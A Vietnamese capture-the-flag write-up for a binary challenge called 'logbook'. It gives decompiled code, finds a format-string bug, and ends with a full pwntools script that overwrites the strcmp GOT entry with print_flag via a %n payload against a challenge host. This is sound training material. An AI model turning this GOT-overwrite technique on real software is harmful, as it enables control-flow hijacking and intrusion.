# logbook
## IDA
- Bài này khá nhiều hàm nhưng mình cần 1 số hàm sau đây là đủ

<details><summary>IDA</summary>

```c
unsigned __int64 print_flag()
{
  FILE *v1; // [rsp+8h] [rbp-78h]
  char v2[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = fopen("./flag.txt", "r");
  if ( v1 )
  {
    __isoc99_fscanf(v1, "%99s", v2);
    printf("%s", v2);
  }
  else
  {
    puts("file does not exist");
  }
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 logbook()
{
  void *ptr; // [rsp+8h] [rbp-98h]
  char s[8]; // [rsp+10h] [rbp-90h] BYREF
  __int64 v3; // [rsp+18h] [rbp-88h]
  char v4; // [rsp+20h] [rbp-80h]
  char format[104]; // [rsp+30h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+98h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  *(_QWORD *)s = 0LL;
  v3 = 0LL;
  v4 = 0;
  gen_pass(s, 16LL);
  puts(s);
  puts("| ---------------------------------------- |");
  puts("| >>> S.C.U.B.A.    Diving    logbook <<<  |");
  puts("| ---------------------------------------- |");
  puts("|            VERSION 3.0-SKPR              |");
  puts("| ________________________________________ |\n");
  ptr = malloc(0xCuLL);
  memset(ptr, 0, 0xCuLL);
  memset(format, 0, 0x64uLL);
  puts("Dive date:");
  __isoc99_scanf("%11s", ptr);
  puts("Dive location:");
  __isoc99_scanf("%99s", format);
  puts(" _______________________________________");
  puts("|                SUMMARY                |");
  puts("|_______________________________________|");
  printf("DATE: %s\n", (const char *)ptr);
  printf("LOCATION: ");
  printf(format);
  putchar(10);
  record_logs(s);
  free(ptr);
  return __readfsqword(0x28u) ^ v6;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  ignore_me(argc, argv, envp);
  logbook();
  return 0;
}
```

</details>

## Phân tích

```c
  ptr = malloc(0xCuLL);
  memset(ptr, 0, 0xCuLL);
  memset(format, 0, 0x64uLL);
  puts("Dive date:");
  __isoc99_scanf("%11s", ptr);
  puts("Dive location:");
  __isoc99_scanf("%99s", format);
  puts(" _______________________________________");
  puts("|                SUMMARY                |");
  puts("|_______________________________________|");
  printf("DATE: %s\n", (const char *)ptr);
  printf("LOCATION: ");
  printf(format);           //fmt
  putchar(10);
  record_logs(s);
  free(ptr);
```

- Ở hàm logbook có 1 lỗi fmt, khi này ta có thể in ra, khi này mình mới nảy ra ý tưởng mình ow got của `putchar()` thành hàm `print_flag`.
- Khi này mình checksec ra thì không có PIE, nghĩa ow got là khả thi vì chỉ có 3 byte (0x404020)
- Tuy nhiên `scanf()` sẽ dừng đọc từ bàn phím khi gặp bull byte hoặc `/n = 0x20` và không đọc 2 byte đó
- Vậy mục tiêu của ta cần là hàm khác. Đọc `record_log` thì ta thấy có sài hàm `memset` và `strcmp`, do vậy 1 trong 2 hàm có vẻ oke. Ở đây mình chọn `strcmp`

# Khai thác

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('binary', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000401961

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('rumble.host', 20776)
else:
        p = process(exe.path)

GDB()
sla(b"date:", b"123")
payload = f"%{exe.sym['print_flag']}c%14$n".encode()
payload = payload.ljust(16, b"a")
payload += p64(0x404028)
sla(b"location:", payload)
p.interactive()
```